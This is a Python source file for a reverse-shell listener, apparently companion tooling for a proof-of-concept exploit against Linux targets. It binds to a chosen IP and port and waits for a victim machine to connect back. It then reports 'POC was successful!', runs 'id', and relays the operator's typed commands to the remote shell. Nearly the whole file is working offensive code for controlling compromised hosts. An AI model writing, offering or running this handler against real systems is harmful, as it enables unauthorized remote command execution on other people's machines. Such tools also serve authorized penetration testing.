import socket
import argparse
import threading
import time
import os

light_gray_color = '\033[37;1m'
dimmed_gray_color = '\033[90m'
honey_yellow_color = '\033[38;5;214m'
dim_yellow_color = "\033[33;1m"
cyan_color = '\033[96m'
green_color = '\033[92m'
red_color = '\033[31m'
reset_color = '\033[0m'

LOG_DIR = "logs"

def banner():
    print(f'''{honey_yellow_color}
listen ip port for shell
          
-> {light_gray_color}Will try to obtain a shell on linux targets.{reset_color}
''')

def print_message(level, message):
    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
    if level == 'info':
        print(f"{current_time} {green_color}[INFO]{reset_color} {message}")
    elif level == 'warning':
        print(f"{current_time} {honey_yellow_color}[VLUN] {message} {reset_color}")
    elif level == 'error':
        print(f"{current_time} {red_color}[ERROR]{message}{reset_color} ")


def create_log_dir():
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)
        print_message('info', f"Log directory created: {LOG_DIR}")

def receive_output(client_socket, timeout=5):
    total_data = []
    client_socket.setblocking(0)
    start_time = time.time()
    while True:
        if total_data and time.time() - start_time > timeout:
            break
        elif time.time() - start_time > timeout * 2:
            break
        try:
            data = client_socket.recv(8192)
            if data:
                total_data.append(data.decode('utf-8', errors='ignore'))
                start_time = time.time()
            else:
                time.sleep(0.1)
        except socket.error:
            pass
    return ''.join(total_data).strip()

def interactive_shell(client_socket):
    print_message('warning', "Nice!, we got a remote shell! :)")
    
    client_socket.send(b"id\n")
    time.sleep(0.1)
    output = receive_output(client_socket)
    if output:
        print_message('warning', "Checking the output of 'id' command:")
        print(f"{output}")
    else:
        print("No output received from 'id' command.")

    print_message('warning', "Shell established!.")
    print_message('warning', "Type commands and press enter to send, or type 'exit' to end the session.")
    
    while True:
        try:
            command = input(f"{honey_yellow_color}shell> {reset_color}")
            if command.lower() == 'exit':
                break
            
            client_socket.send(command.encode() + b'\n')
            time.sleep(0.1)
            
            output = receive_output(client_socket)
            if output:
                print(output)
            else:
                print_message('warning', "No output received.")
        
        except Exception as e:
            print_message('error', f"Error in shell: {e}")
            break
    
    client_socket.close()
    print_message('info', "Shell connection closed.")
    exit()

def listen(ip, port, stop_event):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, port))
    s.settimeout(1)
    s.listen(1)
    print_message('info', f"Listening on {ip}:{port}...")

    try:
        while not stop_event.is_set():
            try:
                client, (client_ip, client_port) = s.accept()
                print_message('info', f"Received connection from: {client_ip}:{client_port}")
                print_message('warning', "POC was successful!")
                
                interactive_shell(client)
            except socket.timeout:
                continue 
    except Exception as e:
        print_message('error', f"An error occurred: {e}")
    finally:
        s.close()
        
def main():
    banner()
    parser = argparse.ArgumentParser(description='listen ip port')
    parser.add_argument('-ip', required=True, help='Your IP, example 192.168.1.1')
    parser.add_argument('-port', required=True, help='Port, example 1337')
    #python listen.py -ip 192.168.142.200 -port 4444
    
    args = parser.parse_args()
    
    ip = args.ip
    port = int(args.port)

    stop_event = threading.Event()

    def listen_wrapper():
        listen(ip, port, stop_event)

    listen_thread = threading.Thread(target=listen_wrapper)
    listen_thread.daemon = True
    listen_thread.start()

    time.sleep(1)

    try:
        while listen_thread.is_alive():
            listen_thread.join(1)  
    except KeyboardInterrupt:
        print_message('info', "Keyboard interrupt received. Cleaning up...")
    finally:
        stop_event.set()
        
        # (should be quick now)
        listen_thread.join(timeout=5)
        
        if listen_thread.is_alive():
            print_message('warning', "Listen thread did not stop in time. It will be terminated.")

    print_message('info', "Script execution completed. Exiting...")

if __name__ == "__main__":
    #create_log_dir()
    main()
